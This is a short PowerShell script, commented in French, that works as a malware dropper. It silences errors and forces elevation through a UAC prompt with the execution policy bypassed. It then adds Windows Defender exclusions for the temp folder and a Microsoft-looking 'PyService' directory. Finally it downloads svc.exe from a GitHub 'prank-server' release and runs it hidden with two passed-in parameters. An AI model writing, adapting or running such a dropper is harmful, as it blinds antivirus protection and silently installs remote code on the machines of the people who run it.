param(
    [string]$w = "",
    [string]$t = ""
)

$ErrorActionPreference = "SilentlyContinue"

# ── Auto-elevation UAC ────────────────────────────────────────────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")

if (-not $isAdmin) {
    $args = "-ExecutionPolicy Bypass -File `"$PSCommandPath`" -w `"$w`" -t `"$t`""
    Start-Process powershell -ArgumentList $args -Verb RunAs -Wait
    exit
}

# ── Exclusions Windows Defender ───────────────────────────────────────────────
Add-MpPreference -ExclusionPath "$env:TEMP"
Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Microsoft\PyService"

# ── Telechargement et lancement ───────────────────────────────────────────────
$exe = "$env:TEMP\svc.exe"
curl.exe -sLo $exe "https://github.com/lamziiii/prank-server/releases/latest/download/svc.exe"
Start-Process $exe -ArgumentList "-w `"$w`" -t `"$t`"" -WindowStyle Hidden
